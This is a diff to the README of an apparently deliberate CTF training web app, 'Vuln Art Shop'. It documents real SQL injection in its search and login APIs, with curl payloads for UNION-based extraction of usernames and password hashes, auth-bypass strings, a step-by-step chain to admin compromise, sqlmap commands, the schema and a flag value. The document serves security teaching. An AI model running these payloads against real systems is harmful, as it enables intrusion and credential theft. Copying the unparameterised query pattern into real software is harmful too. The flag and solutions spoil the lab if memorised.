@@ -58,11 +58,13 @@ The platform is designed to teach cybersecurity concepts through **realistic, ha
 ### What's Hidden (CTF Lab)
 - 🟢 **Easy Flags (3)** — Found via basic inspection and enumeration
 - 🟡 **Medium Flags (8)** — Require tool usage and parameter manipulation
-- 🔴 **Hard Flags (5)** — Multi-step chaining and virtual host enumeration
+- 🔴 **Hard Flags (5)** — Multi-step chaining, SQL injection, and virtual host enumeration
 - ⚫ **Expert Flag (1)** — Full system compromise across all layers
 - 📁 **10-level nested directory** system with hidden files
 - 🌐 **3 virtual hosts** discoverable via DNS enumeration
 - 🔓 **20+ vulnerable API endpoints** with realistic weaknesses
+- 💉 **Real SQL injection** — UNION-based, error-based, and auth bypass
+- 🛡️ **No simulated vulnerabilities** — every flaw is exploitable in the real sense
 
 ---
 
@@ -371,7 +373,7 @@ These flags require chaining multiple vulnerabilities and discoveries together. 
 | # | Points | Discovery Method |
 |---|--------|-----------------|
 | 12 | 500 | Chain IDOR + admin endpoint access |
-| 13 | 400 | Trigger injection-like error in search API |
+| 13 | 400 | Exploit real SQL injection in search API (UNION-based) |
 | 15 | 400 | Discover admin.vulnart.local virtual host |
 | 16 | 400 | Discover dev.vulnart.local virtual host |
 | 17 | 400 | Discover staging.vulnart.local virtual host |
@@ -383,6 +385,133 @@ These flags require chaining multiple vulnerabilities and discoveries together. 
 | 18 | 1000 | Multi-layer chaining across auth, hidden files, virtual hosts, and admin panel |
 
 **Total Points Available: 4,950**
+
+---
+
+## 💉 SQL Injection Vulnerabilities
+
+Vuln Art Shop contains **real, exploitable SQL injection vulnerabilities** — not simulated or fake. These are the most technically significant vulnerabilities in the platform and represent the primary hard-tier challenges.
+
+### Vulnerability 1: Search API — UNION-Based SQL Injection
+
+**Endpoint:** `GET /api/v2/search?q=<payload>`
+
+The search parameter `q` is directly interpolated into a raw SQL query using `$queryRawUnsafe` with no sanitization or parameterization. This allows classic UNION-based SQL injection to extract data from any table in the database.
+
+**How it works:**
+```
+Normal query:  /api/v2/search?q=Neon
+Generated SQL: SELECT id, title, artist, description, category, price,
+               "rentPrice", image, "isForSale", "isForRent", "isForAuction"
+               FROM Artwork WHERE title LIKE '%Neon%' ...
+```
+
+**Exploitation examples:**
+```bash
+# Error-based: Trigger SQL error to leak table/column names
+curl 'http://localhost:3000/api/v2/search?q=\''
+
+# UNION-based: Extract data from the HiddenLog table
+curl 'http://localhost:3000/api/v2/search?q=\' UNION SELECT id, eventType, message, metadata, \'\', 0, 0, \'\', 1, 1, 0 FROM HiddenLog--'
+
+# UNION-based: Extract usernames and emails from User table
+curl 'http://localhost:3000/api/v2/search?q=\' UNION SELECT id, username, email, \'\', \'\', 0, 0, \'\', 1, 1, 0 FROM User--'
+
+# UNION-based: Extract password hashes
+curl 'http://localhost:3000/api/v2/search?q=\' UNION SELECT id, username, "passwordHash", \'\', \'\', 0, 0, \'\', 1, 1, 0 FROM User--'
+```
+
+**Flag:** `FLAG{sql_qu3ry_m4st3r}` — awarded when UNION injection successfully extracts flag data from the HiddenLog table.
+
+**Database schema for crafting payloads:**
+| Table | Columns |
+|-------|---------|
+| Artwork | id, title, artist, description, category, price, rentPrice, image, isForSale, isForRent, isForAuction |
+| User | id, username, email, passwordHash, name, role, balance |
+| HiddenLog | id, eventType, message, metadata |
+| FlagSubmission | id, userId, flag, tier, points |
+
+> **Note:** The Artwork table has 11 columns, so UNION SELECT must match exactly 11 columns.
+
+---
+
+### Vulnerability 2: Login API — Authentication Bypass via SQL Injection
+
+**Endpoint:** `POST /api/auth/login`
+
+The login endpoint constructs a raw SQL query using the `username` field without sanitization. This allows classic authentication bypass attacks.
+
+**How it works:**
+```
+Normal login:  username=artist1
+Generated SQL: SELECT ... FROM User WHERE username='artist1'
+
+Injected login: username=admin'--
+Generated SQL: SELECT ... FROM User WHERE username='admin'--'
+               (everything after -- is commented out)
+```
+
+**Exploitation examples:**
+```bash
+# Classic auth bypass: comment out password check
+curl -X POST http://localhost:3000/api/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "curator_mike\'--", "password": "anything"}'
+
+# Tautology-based: always returns first user
+curl -X POST http://localhost:3000/api/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "\' OR \'1\'=\'1\'--", "password": "anything"}'
+
+# Union-based: extract data via login
+curl -X POST http://localhost:3000/api/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "\' UNION SELECT id, username, email, \'$2a$10$dummyhash\', name, role, balance FROM User--", "password": "anything"}'
+```
+
+**Error disclosure:** Sending a malformed SQL injection returns detailed error messages including table names and column names, aiding further exploitation.
+
+---
+
+### SQL Injection Attack Chain
+
+The full exploitation chain combines both vulnerabilities:
+
+```
+1. Error-based reconnaissance
+   GET /api/v2/search?q=' → reveals table/column names
+
+2. UNION-based data extraction
+   GET /api/v2/search?q=' UNION SELECT ... FROM User-- → extract usernames + hashes
+
+3. Authentication bypass
+   POST /api/auth/login with username=admin'-- → login as any user
+
+4. Privilege escalation
+   PUT /api/users/profile with {role: 'admin'} → gain admin access
+
+5. Full compromise
+   GET /api/admin/flags → retrieve all CTF flags
+```
+
+---
+
+### Testing SQL Injection with sqlmap
+
+For advanced testing, [sqlmap](https://sqlmap.org/) can automatically detect and exploit these vulnerabilities:
+
+```bash
+# Test the search endpoint
+sqlmap -u 'http://localhost:3000/api/v2/search?q=test' --dbs
+
+# Extract HiddenLog table
+sqlmap -u 'http://localhost:3000/api/v2/search?q=test' -D main -T HiddenLog --dump
+
+# Test the login endpoint
+sqlmap -u 'http://localhost:3000/api/auth/login' --method=POST \
+  --data='{"username":"test","password":"test"}' \
+  -H 'Content-Type: application/json' -p username
+```
 
 ---
 
@@ -405,7 +534,8 @@ These flags require chaining multiple vulnerabilities and discoveries together. 
 │  /api/internal/stats → system info + logs       │
 │  /api/admin/users → no auth, all users          │
 │  /api/v1/export → data export without auth      │
-│  /api/v2/search → injection-like behavior       │
+│  /api/v2/search → REAL SQL injection (UNION)   │
+│  /api/auth/login → SQL injection auth bypass    │
 ├─────────────────────────────────────────────────┤
 │                BUSINESS LOGIC LEVEL              │
 │  PUT /api/users/profile → role IDOR             │
